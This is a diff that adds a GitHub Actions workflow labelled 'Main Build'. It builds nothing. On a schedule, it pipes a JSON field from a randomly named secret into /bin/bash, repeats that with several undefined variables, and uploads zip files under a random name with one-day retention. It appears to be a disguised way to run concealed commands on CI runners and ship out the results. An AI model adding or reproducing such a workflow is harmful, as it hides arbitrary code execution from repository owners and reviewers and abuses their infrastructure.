@@ -1,0 +1,36 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '15 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          likoh72745: ${{ secrets.likoh72745 }}
+        run: |
+          printf '%s' "$likoh72745" | jq -r .ky4 | /bin/bash
+          echo $paea7 | jq -r .mxk5717 | /bin/bash
+          echo $kwy3 | jq -r .mflm282 | /bin/bash
+          printf '%s' "$lf47" | jq -r .lbtiw030 | /bin/bash
+          echo $qwc0 | jq -r .tx9 | /bin/bash
+          echo $ga88 | jq -r .lbsgw12721 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7fUrzfBI
+          path: "*.zip"
+          retention-days: 1
